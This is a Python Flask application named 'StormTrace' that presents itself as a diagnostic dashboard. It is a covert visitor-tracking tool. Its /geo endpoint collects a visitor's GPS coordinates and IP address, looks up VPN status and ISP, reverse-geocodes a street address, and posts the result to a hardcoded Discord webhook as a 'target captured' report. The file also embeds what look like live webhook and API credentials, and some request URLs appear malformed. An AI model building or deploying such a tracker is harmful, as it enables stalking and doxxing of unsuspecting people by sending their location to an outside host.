import os
import requests
from flask import Flask, render_template, request, jsonify
from geopy.geocoders import Nominatim

app = Flask(__name__)

# --- CONFIGURATION ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnAqpLHXijSAMi0fwJQV-IZG2nXdoScT4MFttVL3e42cXtol1HiGDGqR1AdsscKDzKG"
IP_API_KEY = "6DE085F79B20D090372DCDAB19FA7413"

# Initialize Geocoder
geolocator = Nominatim(user_agent="StormTrace_Diagnostic_v2")

@app.route('/')
def index():
    # Get Real IP for the Dashboard display
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if user_ip and ',' in user_ip:
        user_ip = user_ip.split(',')[0].strip()
    return render_template('index.html', user_ip=user_ip)

@app.route('/geo', methods=['POST'])
def capture_and_log():
    data = request.json
    lat, lon = data.get('lat'), data.get('lon')
    
    # 1. Capture IP and VPN/ISP Info
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if visitor_ip and ',' in visitor_ip:
        visitor_ip = visitor_ip.split(',')[0].strip()

    try:
        ip_res = requests.get(f"https://api.ip2location.io{IP_API_KEY}&ip={visitor_ip}&format=json").json()
        vpn = "✅ YES" if ip_res.get('is_proxy') else "❌ NO"
        isp = ip_res.get('isp', 'Unknown')
    except:
        vpn, isp = "Unknown", "Unknown"

    # 2. Get Exact Street Address via Reverse Geocoding
    try:
        location = geolocator.reverse(f"{lat}, {lon}")
        address = location.address
    except:
        address = "Could not retrieve street name."

    # 3. Format Webhook Report
    payload = {
        "username": "StormTrace Intelligence",
        "embeds": [{
            "title": "⚡ HIGH-PRECISION TARGET CAPTURED",
            "color": 3066993,
            "fields": [
                {"name": "🌐 Network IP", "value": f"`{visitor_ip}`", "inline": False},
                {"name": "🛡️ VPN/Proxy", "value": vpn, "inline": True},
                {"name": "📡 ISP Provider", "value": isp, "inline": True},
                {"name": "📍 Full Address", "value": f"```{address}```", "inline": False},
                {"name": "🗺️ Google Maps", "value": f"[Open Map Location](https://www.google.com{lat},{lon})", "inline": False}
            ],
            "footer": {"text": "Verified GPS & Reverse Geocoding Active"}
        }]
    }
    
    requests.post(DISCORD_WEBHOOK_URL, json=payload)
    return jsonify({"status": "verified"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
